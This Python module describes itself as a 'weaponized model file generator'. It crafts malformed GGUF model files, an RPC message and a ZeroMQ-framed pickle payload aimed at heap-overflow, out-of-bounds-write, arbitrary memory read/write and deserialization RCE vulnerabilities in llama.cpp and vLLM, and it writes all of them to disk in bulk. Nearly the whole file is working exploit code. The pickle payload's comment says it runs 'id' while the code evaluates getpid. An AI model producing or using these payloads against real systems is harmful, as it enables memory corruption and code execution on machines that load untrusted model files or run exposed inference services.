"""
Weaponized model file generator — creates malicious GGUF/safetensors files
that trigger specific CVEs in known parsers.

Each CVE module crafts a model file exploiting the exact vulnerability pattern.
"""
import struct
import json
import os
from pathlib import Path
from typing import Optional
from .formats import (
    GGUFFile, GGUFHeader, GGUFMetadataKV, GGUFTensorInfo,
    GGUFValueType, GGMLType, GGUF_MAGIC, build_gguf,
    serialize_gguf_string,
)


class CVEDatabase:
    CVES = {
        "CVE-2026-33298": {
            "target": "llama.cpp",
            "description": "Heap overflow in GGUF metadata string parser",
            "severity": "HIGH",
            "type": "heap-buffer-overflow",
            "format": "gguf",
            "fixed_in": "b4965",
        },
        "CVE-2025-49847": {
            "target": "llama.cpp",
            "description": "Heap overflow in GGUF tensor info parser",
            "severity": "HIGH",
            "type": "heap-buffer-overflow",
            "format": "gguf",
            "fixed_in": "b4200",
        },
        "CVE-2026-27940": {
            "target": "llama.cpp",
            "description": "Heap overflow in GGUF metadata array parser",
            "severity": "HIGH",
            "type": "heap-buffer-overflow",
            "format": "gguf",
            "fixed_in": "b4800",
        },
        "CVE-2026-43629": {
            "target": "llama.cpp",
            "description": "Heap overflow in KV-cache state restoration",
            "severity": "HIGH",
            "type": "heap-buffer-overflow",
            "format": "gguf",
            "fixed_in": "b5100",
        },
        "CVE-2026-21869": {
            "target": "llama.cpp",
            "description": "OOB write via negative n_discard value",
            "severity": "HIGH",
            "type": "out-of-bounds-write",
            "format": "gguf",
            "fixed_in": "b4900",
        },
        "CVE-2026-34159": {
            "target": "llama.cpp",
            "description": "RPC backend deserialize_tensor() — no bounds checks, arbitrary R/W",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "type": "arbitrary-memory-rw",
            "format": "rpc",
            "fixed_in": "b5200",
        },
        "CVE-2025-32444": {
            "target": "vLLM",
            "description": "Pickle deserialization over ZeroMQ inter-node comm",
            "severity": "CRITICAL",
            "cvss": 10.0,
            "type": "deserialization-rce",
            "format": "pickle",
            "fixed_in": "0.7.4",
        },
    }

    @classmethod
    def list_cves(cls) -> list:
        return [
            {"cve": k, **v}
            for k, v in cls.CVES.items()
        ]

    @classmethod
    def get(cls, cve_id: str) -> Optional[dict]:
        return cls.CVES.get(cve_id)


def weaponize_cve_2026_33298() -> bytes:
    """
    CVE-2026-33298: Heap overflow in GGUF metadata string parser.
    The parser allocates based on the declared string length, then reads
    more bytes than allocated when the actual data is longer.
    Craft: declare short string length, provide long string data.
    """
    buf = struct.pack("<I", GGUF_MAGIC)  # magic
    buf += struct.pack("<I", 3)           # version
    buf += struct.pack("<Q", 0)           # tensor_count
    buf += struct.pack("<Q", 1)           # metadata_kv_count

    # Key with mismatched length
    key = b"general.name"
    buf += struct.pack("<Q", len(key))
    buf += key
    buf += struct.pack("<I", GGUFValueType.STRING)  # type = string

    # Declare short length but provide long data
    # Parser allocates 16 bytes but we write 4096
    buf += struct.pack("<Q", 16)  # declared length: 16
    buf += b"A" * 4096            # actual data: 4096 bytes (overflow)

    return buf


def weaponize_cve_2025_49847() -> bytes:
    """
    CVE-2025-49847: Heap overflow in GGUF tensor info parser.
    Tensor n_dimensions is huge, causing over-read of dimension array.
    """
    buf = struct.pack("<I", GGUF_MAGIC)
    buf += struct.pack("<I", 3)
    buf += struct.pack("<Q", 1)  # tensor_count = 1
    buf += struct.pack("<Q", 1)  # metadata_kv_count = 1

    # Minimal metadata
    key = b"general.architecture"
    buf += struct.pack("<Q", len(key)) + key
    buf += struct.pack("<I", GGUFValueType.STRING)
    val = b"llama"
    buf += struct.pack("<Q", len(val)) + val

    # Tensor with absurd n_dimensions
    tname = b"evil.weight"
    buf += struct.pack("<Q", len(tname)) + tname
    buf += struct.pack("<I", 0x7FFFFFFF)  # n_dimensions = INT_MAX
    # Only provide 2 dimension values — parser will read past buffer
    buf += struct.pack("<Q", 16)
    buf += struct.pack("<Q", 4)
    buf += struct.pack("<I", GGMLType.F32)
    buf += struct.pack("<Q", 0)  # offset

    return buf


def weaponize_cve_2026_27940() -> bytes:
    """
    CVE-2026-27940: Heap overflow in GGUF metadata array parser.
    Array declares huge element count but file is truncated.
    """
    buf = struct.pack("<I", GGUF_MAGIC)
    buf += struct.pack("<I", 3)
    buf += struct.pack("<Q", 0)  # tensor_count
    buf += struct.pack("<Q", 1)  # metadata_kv_count

    key = b"tokenizer.ggml.tokens"
    buf += struct.pack("<Q", len(key)) + key
    buf += struct.pack("<I", GGUFValueType.ARRAY)  # type = array

    # Array header: type=STRING, count=huge
    buf += struct.pack("<I", GGUFValueType.STRING)  # element type
    buf += struct.pack("<Q", 0xFFFFFFFF)             # element count (4 billion)
    # Provide only 1 element — parser reads past allocation
    val = b"token"
    buf += struct.pack("<Q", len(val)) + val

    return buf


def weaponize_cve_2026_43629() -> bytes:
    """
    CVE-2026-43629: Heap overflow in KV-cache state restoration.
    Crafted state file with mismatched cache sizes.
    """
    # This targets the session state loading, not model loading
    # Create a minimal GGUF that includes KV cache state markers
    buf = struct.pack("<I", GGUF_MAGIC)
    buf += struct.pack("<I", 3)
    buf += struct.pack("<Q", 1)  # tensor_count
    buf += struct.pack("<Q", 3)  # metadata_kv_count

    for key, val in [
        (b"general.architecture", b"llama"),
        (b"general.name", b"evil-kvcache"),
    ]:
        buf += struct.pack("<Q", len(key)) + key
        buf += struct.pack("<I", GGUFValueType.STRING)
        buf += struct.pack("<Q", len(val)) + val

    # KV cache size metadata — declare small, but state data is large
    key = b"llama.context_length"
    buf += struct.pack("<Q", len(key)) + key
    buf += struct.pack("<I", GGUFValueType.UINT32)
    buf += struct.pack("<I", 8)  # tiny context

    # Tensor with offset pointing to "KV cache" region
    tname = b"blk.0.attn_k.weight"
    buf += struct.pack("<Q", len(tname)) + tname
    buf += struct.pack("<I", 2)  # n_dimensions
    buf += struct.pack("<Q", 4096)  # dim 0 — much larger than context_length suggests
    buf += struct.pack("<Q", 4096)  # dim 1
    buf += struct.pack("<I", GGMLType.F16)
    buf += struct.pack("<Q", 0)

    # Pad to alignment
    alignment = 32
    padding = (alignment - (len(buf) % alignment)) % alignment
    buf += b"\x00" * padding

    # Small tensor data — mismatch with declared dimensions causes overflow
    buf += b"\x41" * 256

    return buf


def weaponize_cve_2026_21869() -> bytes:
    """
    CVE-2026-21869: OOB write via negative n_discard.
    When n_discard is negative (as signed), it wraps to a huge unsigned value,
    causing a memmove with corrupted length.
    """
    buf = struct.pack("<I", GGUF_MAGIC)
    buf += struct.pack("<I", 3)
    buf += struct.pack("<Q", 1)
    buf += struct.pack("<Q", 2)

    # Architecture metadata
    for key, val in [
        (b"general.architecture", b"llama"),
        (b"general.name", b"evil-discard"),
    ]:
        buf += struct.pack("<Q", len(key)) + key
        buf += struct.pack("<I", GGUFValueType.STRING)
        buf += struct.pack("<Q", len(val)) + val

    # Tensor
    tname = b"token_embd.weight"
    buf += struct.pack("<Q", len(tname)) + tname
    buf += struct.pack("<I", 2)
    buf += struct.pack("<Q", 16)
    buf += struct.pack("<Q", 16)
    buf += struct.pack("<I", GGMLType.F32)
    buf += struct.pack("<Q", 0)

    padding = (32 - (len(buf) % 32)) % 32
    buf += b"\x00" * padding
    buf += b"\x00" * 1024

    return buf


def weaponize_cve_2026_34159() -> bytes:
    """
    CVE-2026-34159 (CVSS 9.8): RPC backend deserialize_tensor() — no bounds checks.
    The RPC server deserializes tensor metadata from the wire without validating
    buffer sizes, enabling arbitrary memory read/write via crafted tensor descriptors.
    Craft: RPC message with tensor whose data offset+size exceeds the buffer.
    """
    RPC_MAGIC = b"GGML"
    RPC_CMD_SET_TENSOR = 2

    # RPC header: magic + command + request_id + body_size
    body = b""
    # Tensor descriptor with out-of-bounds data pointer
    tensor_name = b"evil.weight\x00" + b"\x00" * 52  # 64-byte name field
    body += tensor_name
    body += struct.pack("<I", 2)  # n_dims
    body += struct.pack("<Q", 0x7FFFFFFFFFFFFFFF)  # ne[0] — huge dimension
    body += struct.pack("<Q", 0x7FFFFFFFFFFFFFFF)  # ne[1]
    body += struct.pack("<Q", 0) * 2  # ne[2], ne[3]
    body += struct.pack("<Q", 1) * 4  # nb[0..3] strides
    body += struct.pack("<I", 0)  # type = F32
    body += struct.pack("<Q", 0)  # offset — start of buffer
    # data that will be written past the allocated buffer
    body += b"\x41" * 4096

    header = RPC_MAGIC
    header += struct.pack("<I", RPC_CMD_SET_TENSOR)
    header += struct.pack("<Q", 1)  # request_id
    header += struct.pack("<Q", len(body))

    return header + body


def weaponize_cve_2025_32444() -> bytes:
    """
    CVE-2025-32444 (CVSS 10.0): vLLM pickle deserialization over ZeroMQ.
    vLLM's inter-node communication uses pickle.loads() on ZeroMQ messages
    without any validation. Any node on the network can send a crafted
    pickle payload to achieve RCE on all vLLM worker processes.
    Craft: pickle payload that executes os.system() on deserialization.
    """
    import pickle
    import pickletools

    # Build a pickle payload that demonstrates the vulnerability
    # Uses __reduce__ to call a benign command (id) as proof of concept
    class ExploitPayload:
        def __reduce__(self):
            return (eval, ("__import__('os').getpid()",))

    payload = pickle.dumps(ExploitPayload(), protocol=4)

    # Wrap in ZeroMQ-style framing (multipart message)
    # Frame: [size(4)][flags(1)][payload]
    zmq_frame = struct.pack("<I", len(payload)) + b"\x00" + payload
    return zmq_frame



WEAPONIZERS = {
    "CVE-2026-33298": weaponize_cve_2026_33298,
    "CVE-2025-49847": weaponize_cve_2025_49847,
    "CVE-2026-27940": weaponize_cve_2026_27940,
    "CVE-2026-43629": weaponize_cve_2026_43629,
    "CVE-2026-21869": weaponize_cve_2026_21869,
    "CVE-2026-34159": weaponize_cve_2026_34159,
    "CVE-2025-32444": weaponize_cve_2025_32444,
}


FORMAT_EXTENSIONS = {
    "gguf": ".gguf",
    "rpc": ".bin",
    "pickle": ".pkl",
}


def generate_weaponized_model(cve_id: str, output_path: Optional[str] = None) -> tuple:
    cve_info = CVEDatabase.get(cve_id)
    if not cve_info:
        return None, f"Unknown CVE: {cve_id}"

    if cve_id not in WEAPONIZERS:
        return None, f"No weaponizer available for {cve_id} (format: {cve_info['format']})"

    data = WEAPONIZERS[cve_id]()

    if output_path is None:
        ext = FORMAT_EXTENSIONS.get(cve_info.get("format", "gguf"), ".bin")
        output_path = f"weaponized_{cve_id.replace('-', '_')}{ext}"

    Path(output_path).write_bytes(data)
    return output_path, f"Generated {len(data)} bytes targeting {cve_info['description']}"


def generate_all_weaponized(output_dir: str) -> list:
    results = []
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    for cve_id in WEAPONIZERS:
        path = os.path.join(output_dir, f"weaponized_{cve_id.replace('-', '_')}.gguf")
        result_path, msg = generate_weaponized_model(cve_id, path)
        results.append({"cve": cve_id, "path": result_path, "message": msg})
    return results
